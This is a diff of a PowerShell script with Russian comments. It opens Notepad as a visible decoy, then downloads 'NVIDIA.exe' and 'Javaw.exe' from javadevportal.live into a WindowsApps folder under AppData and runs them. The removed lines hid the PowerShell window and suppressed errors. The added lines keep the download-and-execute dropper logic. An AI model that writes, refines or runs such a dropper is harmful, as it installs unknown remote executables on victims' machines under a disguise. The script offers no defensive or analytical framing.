@@ -1,34 +1,25 @@
 # Запускаем Блокнот (видно пользователю)
 Start-Process notepad.exe
 
-# Скрываем окно PowerShell (если запущено вручную)
-$windowStyle = if ($PSEdition -eq 'Desktop') { 'Hidden' } else { 'Minimized' }
-$psi = New-Object System.Diagnostics.ProcessStartInfo
-$psi.FileName = 'powershell.exe'
-$psi.Arguments = '-WindowStyle Hidden -Command "& { . $PSCommandPath }"'
-$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-[System.Diagnostics.Process]::Start($psi) | Out-Null
-
-# --- Основной скрипт (работает в фоне) ---
 $gfgff = @(
     "http://javadevportal.live/files/NVIDIA.exe",
     "http://javadevportal.live/files/Javaw.exe"
 )
 
-$savePath = "$env:LOCALAPPDATA\Microsoft\WindowsApps"
-if (-not (Test-Path $savePath)) { New-Item -ItemType Directory -Path $savePath -Force | Out-Null }
+$currentUser = [Environment]::UserName
+$savePath = "C:\Users\$currentUser\AppData\Local\Microsoft\WindowsApps"
+
+if (-not (Test-Path -Path $savePath)) {
+    New-Item -ItemType Directory -Path $savePath -Force | Out-Null
+}
 
 foreach ($link in $gfgff) {
     $fileName = Split-Path -Leaf $link
-    $fullPath = Join-Path $savePath $fileName
+    $fullPath = Join-Path -Path $savePath -ChildPath $fileName
 
-    if (-not (Test-Path $fullPath)) {
-        try {
-            (New-Object Net.WebClient).DownloadFile($link, $fullPath)
-            Start-Process $fullPath -WindowStyle Hidden -ErrorAction SilentlyContinue
-        } catch {}
+    if (-not (Test-Path -Path $fullPath)) {
+        $webClient = New-Object System.Net.WebClient
+        $webClient.DownloadFile($link, $fullPath)
+        Start-Process -FilePath $fullPath
     }
 }
-
-# Закрываем текущий процесс PowerShell (если он виден)
-if ($windowStyle -eq 'Hidden') { Stop-Process -Id $PID }
